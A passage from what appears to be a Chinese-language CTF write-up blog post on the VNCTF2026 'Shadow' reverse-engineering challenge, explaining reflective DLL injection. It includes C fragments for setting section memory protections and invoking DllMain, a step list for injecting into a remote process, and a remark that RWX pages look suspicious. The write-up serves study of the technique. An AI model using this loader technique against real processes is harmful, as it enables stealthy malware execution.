<p>反射 DLL 注入本质上是在手动实现 Windows PE Loader 的工作，而 PE Loader 在加载 DLL 时本来就会根据节属性设置精确的页保护，否则程序无法正常运行。</p>
<p>如果把所有节都设为：PAGE_EXECUTE_READWRITE虽然能跑，但非常可疑</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImgFileHdr.NumberOfSections; i++) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123;<span class="comment">//write</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_WRITECOPY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123;<span class="comment">//read</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READONLY;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) &#123;<span class="comment">//exec</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//readwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_READWRITE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executewrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_WRITECOPY;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ) &#123; <span class="comment">//executeread</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_READ &amp;&amp; peSections[i]-&gt;Characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123; <span class="comment">//executereadwrite</span></span><br><span class="line"></span><br><span class="line">        dwProtection = PAGE_EXECUTE_READWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!VP((PVOID)(pebase + peSections[i]-&gt;VirtualAddress), peSections[i]-&gt;SizeOfRawData, dwProtection, &amp;dwOldProtection)) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调用-dll-入口点"><a href="#调用-dll-入口点" class="headerlink" title="调用 dll 入口点"></a>调用 dll 入口点</h2><p>最后我们刷新指令缓存，使得我们先前的工作生效，然后返回入口点地址就可以了，然后就会完成C运行库的初始化，执行一系列安全检查并调用dllmain。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FIC((HANDLE)-1, NULL, 0x00);</span><br><span class="line"></span><br><span class="line">    /*--------------EXECUTE ENTRY POINT--------------*/</span><br><span class="line">    pDllMain = (fnDllMain)(pebase + pImgNtHdrs-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line">    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);</span><br></pre></td></tr></table></figure>

<h2 id="ReflectiveInject"><a href="#ReflectiveInject" class="headerlink" title="ReflectiveInject"></a>ReflectiveInject</h2><p>在 inject 里面要做的事情主要有一下几步：</p>
<ol>
<li><p><strong>下载&#x2F;读取我们的 DLL 字节</strong></p>
</li>
<li><p><strong>查找 ReflectiveFunction 的 RAW 地址</strong></p>
<p>在DLL文件中找到ReflectiveFunction的原始地址。这通常需要解析DLL的PE结构以定位目标函数的地址。</p>
<p>反射注入的关键在于：把 DLL 原始字节塞进了远程进程的一块内存里，但<strong>系统并不知道那是个模块</strong>，也不会解析导入表&#x2F;重定位&#x2F;节权限等。</p>
<p>所以必须先定位一个引导入口函数（常叫 ReflectiveLoader &#x2F; ReflectiveFunction）：</p>
<ul>
<li>这个函数的作用不是业务逻辑，而是<strong>在目标进程里把自己加载成一个真正可运行的模块</strong>。</li>
<li>因为DLL 还没被正常加载，所以没法靠常规方式（比如 GetProcAddress(模块句柄, 函数名)）去找它。</li>
<li>因此只能从 DLL 文件的 <strong>PE 结构</strong>里定位它在文件中的位置（RAW&#x2F;文件偏移），然后换算成将来写进远程内存后的对应地址。</li>
</ul>
<p>可以把它想象成：</p>
<blockquote>
<p>把一本书（DLL字节）搬进别人家（远程进程），但书还没拆封（没加载）。得先找到拆封说明书的那一页（ReflectiveLoader），然后让别人从那一页开始读，才能把书摊开用。</p>
</blockquote>
</li>
<li><p><strong>在远程进程中分配内存</strong>：在目标远程进程中分配足够的内存，以容纳即将写入的DLL字节。</p>
</li>
<li><p><strong>在远程内存位置写入 RAW 字节</strong>：将下载或读取到的DLL字节写入分配好的远程内存中。</p>
</li>
<li><p><strong>创建一个将运行“ReflectiveLoader”函数的远程线程</strong>:在远程进程中创建一个线程，以运行ReflectiveLoader函数，这样DLL就可以在目标进程中进行自我加载。</p>
<p>在目标进程里，必须有一段代码开始执行，去完成自加载那一整套动作。ReflectiveLoader 就相当于一个<strong>微型PE加载器</strong>，它运行后通常会：</p>
<ol>
<li>在目标进程里为“最终映像”再找&#x2F;准备一块合适的内存</li>
<li>把各节按内存布局重新安放</li>
<li>修复重定位 + 解析导入</li>
<li>设置节权限</li>
<li>调用入口初始化（DLLMain &#x2F; TLS 等）</li>
<li>然后返回&#x2F;自清理（不同实现不同）</li>
</ol>
</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12996">PEB及其武器化-先知社区</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://matriy330.github.io">Matriy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://matriy330.github.io/fe2f4500/">http://matriy330.github.io/fe2f4500/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://matriy330.github.io" target="_blank">Matriy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Re/">Re</a></div><div class="post-share"><div class="social-share" data-image="/img/tx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/zsm.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zsm.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/41a159b6/" title="Angr 学习"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Angr 学习</div></div><div class="info-2"><div class="info-item-1">Angr 学习文章参考：angr初探 | moyaoxueの小屋和Angr入门和Angr：一个具有动态符号执行和静态分析的二进制分析工具-腾讯云开发者社区-腾讯云 Angr简介angr是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。项目创建的初衷，是为了整合此前多种二进制分析方式的优点，并开发一个平台，以供二进制分析人员比较不同二进制分析方式的优劣，并根据自身需要开发新的二进制分析系统和方式。 也正是因为angr是一个二进制文件分析的工具包，因此它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面。 angr 官方文档 angr_ctf项目GitHub - jakespringer&#x2F;angr_ctf  angr_ctf则是一个专门针对angr的项目，里面有17个angr相关的题目。这些题目只有一个唯一的要求：你需要找出能够使程序输出“Good Job”的输入，这也是符号执行常见的应用场景。  本系列教程是angr的入门教程，将通过做angr_ctf中的题目的形式来介绍angr。 Angr初探Angr...</div></div></div></a><a class="pagination-related" href="/32958ffb/" title="CTF逆向常见加密算法总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-01</div><div class="info-item-2">CTF逆向常见加密算法总结</div></div><div class="info-2"><div class="info-item-1">CTF逆向常见加密算法总结流密码系列 只要识别出流密码，我们就可以选择动态调试获取密钥流或者直接把目标密文 patch 进去拿输出就可以了  RC4比较常见，原理不赘述，可以看我的RC4&amp;RSA | Matriy’s blog RC4常见时会有一个初始化256个的S盒操作 解密代码 12345678910111213141516171819202122232425262728293031key = list(&#x27;RC4_1s_4w3s0m3&#x27;)content = [0xA7, 0x1A, 0x68, 0xEC, 0xD8, 0x27, 0x11, 0xCC, 0x8C, 0x9B, 0x16, 0x15, 0x5C, 0xD2, 0x67, 0x3E, 0x82, 0xAD,           0xCE, 0x75, 0xD4, 0xBC, 0x57, 0x56, 0xC2, 0x8A, 0x52, 0xB8, 0x6B, 0xD6, 0xCC, 0xF8, 0xA4, 0xBA, 0x72, 0x2F,           0xE0, 0x57,...</div></div></div></a><a class="pagination-related" href="/21e5b258/" title="CTF逆向常见反调试技术总结"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-07</div><div class="info-item-2">CTF逆向常见反调试技术总结</div></div><div class="info-2"><div class="info-item-1">CTF逆向常见反调试技术总结反调试主要为了干扰动态调试 反调试是一种用于阻碍程序动态调试的技术，首先大致说明一下反调试的工作原理。 在操作系统内部提供了一些API，用于调试器调试。当调试器调用这些API时系统就会在被调试的进程内存中留下与调试器相关的信息。一部分信息是可以被抹除的，也有一部分信息是难以抹除的。 当调试器附加到目标程序后，用户的很多行为将优先被调试器捕捉和处理。其中大部分是通过异常捕获通信的，包括断点的本质就是异常。如果调试器遇到不想处理的信息，一种方式是忽略，另一种方式是交给操作系统处理。 那么目前为止，程序就有两种方式检测自己是否被调试：  检测内存中是否有调试器的信息。 通过特定的指令或触发特定异常，检测返回结果。  通常来说，存在反调试的程序，当检测到自身处于调试状态时，就会控制程序绕过关键代码，防止关键代码被调试，或者干脆直接退出程序。 API反调试1BOOL IsDebuggerPresent();  返回值为1表示当前进程被调试的状态，反之为0. 123call IsDebuggerPresenttest al, aljne...</div></div></div></a><a class="pagination-related" href="/1e7e61d9/" title="IDA e语言逆向初探-以一道CTF题为例"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-04</div><div class="info-item-2">IDA e语言逆向初探-以一道CTF题为例</div></div><div class="info-2"><div class="info-item-1">IDA e语言逆向初探-以一道CTF题为例题目附件可以留言找我拿 IDA易语言反编译插件E-Decompiler - 吾爱破解 - 52pojie.cn e语言逆向，安装这个插件然后运行IDA分析  转到可疑函数  url解码后是HXB{YAO-YAO-QIE-KE-NAO} 假的 还发现  这几个串 交叉引用过去  有点像校验了 sub_404196应该是加密函数 有点像rc系列的加密，不知道是不是Rc4，可以猜测它为流加密的算法  如果是流加密的算法最好的解密方式就是再跑一边，看看动调能不能出 x32dbg打开，直接断点到这个大函数调试  调试可能有反调试，注意开下sharpod这个插件   基于假设我们可以试试看直接把密文patch回去 可以看到我输入的123  下面在ebp-4的地方是密文  在内存中修改为下面那段，注意的是patch记得别把最后的00字节给删了 要修改的字节粘贴进去这个串    一开始patch错了patch的第一个字符是88，后面也没保存结果所以是HXB{HAHA-HEHE-HEIHEI-HUOHUO-XIXI} 12345enc =...</div></div></div></a><a class="pagination-related" href="/f05d2f57/" title="IDAPython脚本(7.5以上)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-29</div><div class="info-item-2">IDAPython脚本(7.5以上)</div></div><div class="info-2"><div class="info-item-1">IDAPython脚本(7.5以上)IDAPython是很强大的功能. 但是在7.5支持python3之后很多函数都改变了. 所以从头开始学一下. IDAPython官方函数文档: IDAPython官方文档函数查询 IDC函数官方文档查询: IDC函数 IDA版本与版本之间的差异化函数查询: IDA版本函数差异化 指令相关 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from idaapi import *from ida_dbg import *from ida_bytes import *# 返回目标地址指向的指令的前一条指令的地址# 参数一是查找的开始地址，参数二是往前查找的最小地址（在范围内）prev_1 = prev_head(0x00007FF6A1AA2577, 1)prev_2 = prev_head(0x00007FF6A1AA257a,...</div></div></div></a><a class="pagination-related" href="/791560d6/" title="UE4逆向初探-OverWatch"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-14</div><div class="info-item-2">UE4逆向初探-OverWatch</div></div><div class="info-2"><div class="info-item-1">UE4逆向初探-OverWatch可以看这个线上培训 -先知社区 赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了  好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T     dump工具：Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 -...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Matriy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Matriy330"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习安卓逆向 (*^_^*)</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shadow"><span class="toc-text">Shadow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">动态分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DLL%E6%B3%A8%E5%85%A5"><span class="toc-text">DLL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateRemoteThread"><span class="toc-text">CreateRemoteThread</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppInit-DLLs"><span class="toc-text">AppInit_DLLs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96"><span class="toc-text">Windows消息钩取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84DLL%E6%B3%A8%E5%85%A5"><span class="toc-text">反射DLL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ReflectiveDLL"><span class="toc-text">ReflectiveDLL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89"><span class="toc-text">变量定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E9%9C%80%E7%B3%BB%E7%BB%9F-api"><span class="toc-text">获取所需系统 api</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7-dll-%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4"><span class="toc-text">申请 dll 所需要的内存空间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E5%88%B6%E8%8A%82"><span class="toc-text">复制节</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%AF%BC%E5%85%A5%E8%A1%A8-IAT"><span class="toc-text">修复导入表 IAT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8"><span class="toc-text">修复重定位表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E6%AF%8F%E4%B8%AA%E8%8A%82%E5%88%86%E9%85%8D%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%86%85%E5%AD%98%E5%B1%9E%E6%80%A7"><span class="toc-text">为每个节分配正确的内存属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8-dll-%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text">调用 dll 入口点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReflectiveInject"><span class="toc-text">ReflectiveInject</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/fe2f4500/" title="VNCTF2026 Shadow分析[驱动分析+反射注入]">VNCTF2026 Shadow分析[驱动分析+反射注入]</a><time datetime="2026-02-23T14:29:34.000Z" title="发表于 2026-02-23 22:29:34">2026-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/21537f75/" title="VNCTF2026 Re">VNCTF2026 Re</a><time datetime="2026-02-23T14:27:32.000Z" title="发表于 2026-02-23 22:27:32">2026-02-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/568117e0/" title="Aliyunctf 2026 re"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/Android_top.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Aliyunctf 2026 re"/></a><div class="content"><a class="title" href="/568117e0/" title="Aliyunctf 2026 re">Aliyunctf 2026 re</a><time datetime="2026-02-21T16:00:00.000Z" title="发表于 2026-02-22 00:00:00">2026-02-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/98161e65/" title="ByteCTF2022 MITM分析"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/Android_top.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ByteCTF2022 MITM分析"/></a><div class="content"><a class="title" href="/98161e65/" title="ByteCTF2022 MITM分析">ByteCTF2022 MITM分析</a><time datetime="2026-02-04T08:20:37.000Z" title="发表于 2026-02-04 16:20:37">2026-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/f9566dab/" title="Bytectf2022 GoldDroid复现"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/Android_top.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bytectf2022 GoldDroid复现"/></a><div class="content"><a class="title" href="/f9566dab/" title="Bytectf2022 GoldDroid复现">Bytectf2022 GoldDroid复现</a><time datetime="2026-01-28T13:58:37.000Z" title="发表于 2026-01-28 21:58:37">2026-01-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By Matriy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img no-lazy src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p> <p>Hi, welcome to Matriy's <a target="_blank" rel="noopener" href="https://butterfly.js.org/">blog</a>!</p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo.matriy.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo.matriy.top/',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    GLOBAL_CONFIG_SITE.pageType === 'post' && getCount()

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="/js/anzhiyu.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/lite/builds/browser.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div></body></html>